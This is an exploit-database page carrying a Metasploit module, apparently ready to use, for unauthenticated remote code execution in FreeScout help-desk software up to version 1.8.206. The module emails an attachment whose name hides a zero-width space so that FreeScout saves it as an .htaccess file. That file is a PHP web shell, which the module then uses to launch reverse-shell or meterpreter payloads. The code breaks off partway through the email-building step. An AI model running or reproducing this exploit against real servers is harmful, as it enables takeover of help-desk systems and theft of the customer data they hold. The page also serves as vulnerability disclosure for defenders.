---
title: FreeScout Unauthenticated RCE via ZWSP .htaccess Bypass
url: https://cxsecurity.com/issue/WLB-2026030038
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-31
fetch_date: 2026-04-01T04:45:14.095105
---

# FreeScout Unauthenticated RCE via ZWSP .htaccess Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **FreeScout Unauthenticated RCE via ZWSP .htaccess Bypass** **2026.03.31**  Credit:  **[offensiveee](https://cxsecurity.com/author/offensiveee/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-28289](https://cxsecurity.com/cveshow/CVE-2026-28289/ "Click to see CVE-2026-28289")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Payload::Php
include Msf::Exploit::CmdStager
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::SMTPDeliver
prepend Msf::Exploit::Remote::AutoCheck
ZWSP = "\u200B".encode('UTF-8').freeze
HTACCESS\_BODY = <<~HTACCESS.freeze
<Files ".htaccess">
Require all granted
SetHandler application/x-httpd-php
</Files>
HTACCESS
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'FreeScout Unauthenticated RCE via ZWSP .htaccess Bypass',
'Description' => %q{
This module exploits an unauthenticated remote code execution vulnerability
in FreeScout <= 1.8.206 (CVE-2026-28289). The sanitizeUploadedFileName()
function checks for dot-prefixed filenames before stripping Unicode format
characters (ZWSP U+200B), allowing .htaccess upload via email attachment.
A crafted email is sent via SMTP to a FreeScout mailbox. When fetched by
the IMAP/POP3 cron (typically every 60s), the ZWSP is stripped and the
attachment is stored as .htaccess. The file uses SetHandler to make itself
executable as PHP, achieving code execution when requested via HTTP.
Requires a valid mailbox email address and web-accessible attachment
storage (storage:link pointing to storage/app/).
},
'Author' => [
'offensiveee', # CVE-2026-27636 discovery
'Nir Zadok (nirzadokox) <OX Security>', # CVE-2026-28289 discovery
'Moses Bhardwaj (MosesOX) <OX Security>', # CVE-2026-28289 discovery
'Valentin Lobstein <chocapikk[at]leakix.net>' # Metasploit module
],
'License' => MSF\_LICENSE,
'References' => [
['CVE', '2026-28289'],
['CVE', '2026-27636'],
['GHSA', '5gpc-65p8-ffwp', 'freescout-help-desk/freescout'],
['GHSA', 'mw88-x7j3-74vc', 'freescout-help-desk/freescout'],
['URL', 'https://www.ox.security/blog/freescout-rce-cve-2026-28289/'],
['URL', 'https://www.ox.security/blog/freescout-rce-cve-2026-27636/']
],
'Targets' => [
[
'PHP In-Memory', {
'Platform' => 'php',
'Arch' => ARCH\_PHP,
'Type' => :php
# tested with php/meterpreter/reverse\_tcp
}
],
[
'Unix/Linux Command Shell', {
'Platform' => %w[unix linux],
'Arch' => ARCH\_CMD,
'Type' => :cmd
# tested with cmd/unix/reverse\_bash
}
],
[
'Linux Dropper', {
'Platform' => 'linux',
'Arch' => [ARCH\_X86, ARCH\_X64],
'Type' => :dropper
# tested with linux/x64/meterpreter/reverse\_tcp
}
],
[
'Windows Command Shell', {
'Platform' => 'win',
'Arch' => ARCH\_CMD,
'Type' => :cmd
# tested with cmd/windows/reverse\_powershell
}
],
[
'Windows Dropper', {
'Platform' => 'win',
'Arch' => [ARCH\_X86, ARCH\_X64],
'Type' => :dropper
# tested with windows/x64/meterpreter/reverse\_tcp
}
]
],
'DefaultTarget' => 0,
'Privileged' => false,
'DisclosureDate' => '2026-03-01',
'Notes' => {
'AKA' => ['Mail2Shell'],
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
register\_options([
OptString.new('TARGETURI', [true, 'Base path to FreeScout', '/']),
OptAddress.new('HTTPHOST', [true, 'FreeScout web server address']),
OptPort.new('HTTPPORT', [true, 'FreeScout web server port', 80])
])
# Override SMTPDeliver's SUBJECT with a default (random if blank)
deregister\_options('SUBJECT')
register\_advanced\_options([
OptString.new('SUBJECT', [false, 'Email subject (random if blank)', '']),
OptInt.new('FETCH\_WAIT', [true, 'Seconds to wait for cron fetch cycle', 60]),
OptInt.new('DIR\_COUNTER', [true, 'Max attachment counter per directory', 3])
])
end
def check
res = http\_send('uri' => normalize\_uri(target\_uri.path, 'login'))
return CheckCode::Unknown('Could not connect to the target.') unless res
return CheckCode::Safe('Target does not appear to be FreeScout.') unless res.body.to\_s.match?(/[Ff]ree[Ss]cout/)
CheckCode::Detected('FreeScout detected. Version cannot be determined remotely.')
end
def exploit
marker = Rex::Text.rand\_text\_alphanumeric(16)
@param = Rex::Text.rand\_text\_alpha(4)
@cleanup\_param = Rex::Text.rand\_text\_alpha(4)
print\_status("Sending exploit email to #{datastore['MAILTO']} via #{rhost}:#{rport}")
send\_message(build\_email(marker))
print\_good('Exploit email sent')
wait\_for\_cron
@shell\_uri = find\_shell(marker)
fail\_with(Failure::NotFound, 'Shell not found after two cron cycles.') unless @shell\_uri
print\_good("Shell at #{@shell\_uri}")
case target['Type']
when :php then http\_send('method' => 'POST', 'uri' => @shell\_uri, 'timeout' => 1)
when :cmd then execute\_command(payload.encoded)
when :dropper then execute\_cmdstager(background: true)
end
end
def cleanup
super
return unless @shell\_uri
http\_send(
'method' => 'POST',
'uri' => @shell\_uri,
'vars\_post' => { @cleanup\_param => '1' },
'timeout' => 5
)
end
# The marker is embedded in the .htaccess so we can identify ours among
# pre-existing ones from prior exploits and avoid triggering the wrong shell.
def build\_email(marker)
gate = "if($\_SERVER['REQUEST\_METHOD']!=='POST'){die();}if(isset($\_POST['#{@cleanup\_param}'])){@unlink(\_\_FILE\_\_);die();}"
if target['Type'] == :php
exec = payload.encoded
else
vars = Rex::RandomIdentifier::Generator.new(language: :php)
preamble = php\_preamble(vars\_generator: vars).gsub(/\s\*\n\s\*/, '')
decode = "#{vars[:cmd\_varname]}=base64\_decode($\_POST[\"#{@param}\"]);"
sysblock = php\_system\_block(vars\_generator: vars).gsub(/\s\*\n\s\*/, '')
exec = preamble + decode + sysblock
end
php\_code = gate + exec
mime = Rex::MIME::Message.new
mime.mime\_defaults
mime.header.set('Subject', datastore['SUBJECT'].present? ? datastore['SUBJECT'] : Rex::Text.rand\_text\_alpha(8..16))
mime.header.set('From', datastore['MAILFROM'])
mime.header.set('To', datastore['MAILTO'])
mime.head...